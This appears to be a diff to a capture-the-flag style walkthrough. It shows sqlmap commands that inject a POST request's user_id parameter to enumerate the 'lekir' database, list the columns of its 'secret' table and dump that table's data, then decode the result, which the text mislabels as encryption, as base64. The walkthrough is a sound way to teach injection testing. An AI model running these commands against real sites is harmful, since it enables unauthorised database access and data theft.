@@ -53,10 +53,35 @@ sqlmap -r post-request -p user_id --dbs
 
 ![image 6](./img/image6.png)
 
-I can see that there is a database named lekir which refers to my target site. So now, I want to look for the tables that avaible in this database. Since we know the name of the db, we can use this option `-D` follow by the name of the db to select the db. `--tables` is to show the tables that are avaible in this db
+We can see that there is a database named lekir which refers to my target site. So now, I want to look for the tables that avaible in this database. Since we know the name of the db, we can use this option `-D` follow by the name of the db to select the db. `--tables` is to show the tables that are avaible in this db
 <br>
+
 `
 sqlmap -r post-request -p user_id -D lekir --tables
 `
-![image 7](./img/image7)
 
+![image 7](./img/image7.png)
+
+The secret table looks suspicious. let's take a look inside it.
+
+`
+sqlmap -r post-request -p user_id -D lekir -T secret --columns
+`
+
+![image 8](./img/image8.png)
+
+Now, we can see that there are two columns in this table which are `secret_id` and `secret_data`. Lets dump the `secret_data` column to see what the data is.<br>
+
+`
+sqlmap -r post-request -p user_id -D lekir -T secret -C secret_data --dump
+`
+
+![image 9](./img/image9.png)
+
+Oh no! the text was encrypted. But it's okey, we can decrypt this if we know the type of encryption. Copy the encrypted text and paste it in any online cipher detector.<br>
+
+`
+https://www.boxentriq.com/code-breaking/cipher-identifier
+`
+
+We now know the text was encrypted using base64. Go to any online base64 decorder and paste the encrypted file.
